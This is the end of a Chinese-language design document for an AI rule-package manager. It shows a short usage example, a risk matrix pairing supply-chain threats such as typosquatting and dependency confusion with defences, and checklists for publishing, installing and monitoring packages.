    // await this.downloadPackage(pkg, installDir);
  }
}


// ============================================
// 使用示例
// ============================================
async function main() {
  const pm = new AIForgePackageManager({
    projectRoot: '/home/user/my-project',
    updateStrategy: 'conservative',
    packageSources: {
      '@internal/config': 'internal',
    },
    scopeRegistries: {
      '@internal': 'https://internal.registry.example.com',
    },
  });

  // 安装包
  await pm.install(['ai-prompts', 'gitlab-auth']);

  // 检查更新
  await pm.update({ dryRun: true });

  // 安全审计
  await pm.audit();

  // 发布新包
  await pm.publish('/home/user/my-rule-package', { dryRun: true });
}

// 运行
// main().catch(console.error);
```

---

## 📊 攻击场景 5 总结矩阵

```
┌──────────────────────┬───────────┬────────────────────────────────┐
│ 攻击面               │ 风险等级  │ 防护措施                       │
├──────────────────────┼───────────┼────────────────────────────────┤
│ 循环依赖             │ 中        │ 深度限制 + 环路检测             │
│ 菱形依赖冲突         │ 中        │ 版本交集 + 冲突解决策略         │
│ 版本约束不可满足     │ 中        │ SAT Solver + 用户提示           │
│ 语义化版本违反       │ 高        │ 变更检测 + 自动化验证           │
│ 版本撤回通知         │ 高        │ 主动通知 + lockfile 检查        │
│ 恶意包(Typosquatting)│ 严重      │ 相似度检测 + 替换攻击检测       │
│ 依赖混淆攻击         │ 严重      │ 内部注册表优先 + 命名空间隔离   │
│ 供应链攻击           │ 严重      │ 签名验证 + 安全扫描             │
│ 安装脚本攻击         │ 严重      │ 沙箱执行 + 危险模式检测         │
│ 代码混淆/后门        │ 严重      │ 熵分析 + 静态分析               │
│ 评分操纵             │ 中        │ 异常检测 + 多维度评分           │
│ 下载量造假           │ 中        │ 来源分析 + 机器人检测           │
│ 搜索结果操纵         │ 中        │ 关键词限制 + 信誉加权           │
│ 关键包废弃           │ 高        │ 健康监控 + 认领机制             │
│ 维护者消失           │ 高        │ 多维护者 + 所有权转移流程       │
│ 包名抢注             │ 中        │ 发布期限 + 注册限制             │
│ 规则冲突             │ 高        │ 冲突检测 + 自动解决策略         │
│ 执行顺序问题         │ 中        │ 阶段化执行 + 拓扑排序           │
│ 格式不兼容           │ 中        │ Schema 验证 + 向后兼容          │
│ 敏感文件泄露         │ 严重      │ 文件扫描 + 发布前检查           │
└──────────────────────┴───────────┴────────────────────────────────┘
```

---

## 🔑 核心架构建议

```
1. 分层信任模型
   ┌─────────────┐
   │  官方包      │  ← 平台团队维护，完全信任
   ├─────────────┤
   │  认证发布者   │  ← 身份验证 + 签名，高信任
   ├─────────────┤
   │  社区包      │  ← 自动扫描 + 评分，中信任
   ├─────────────┤
   │  未验证包    │  ← 强制警告 + 沙箱，低信任
   └─────────────┘

2. 发布前检查清单
   □ manifest.json 格式正确
   □ 语义化版本号正确
   □ 无敏感文件泄露
   □ 安全扫描通过
   □ 包名无 Typosquatting 嫌疑
   □ 规则定义合法
   □ 文档完整（README, CHANGELOG）
   □ 许可证声明

3. 安装时检查清单
   □ 依赖解析成功（无循环/无冲突）
   □ 依赖混淆检查通过
   □ 安全扫描通过
   □ 签名验证通过（如有）
   □ 规则互操作性检查通过
   □ 安装脚本在沙箱中执行
   □ lockfile 更新

4. 持续监控
   □ 定期安全审计
   □ 关键包健康监控
   □ 评分/下载量异常检测
   □ 漏洞通知
   □ 废弃包提醒
```

---
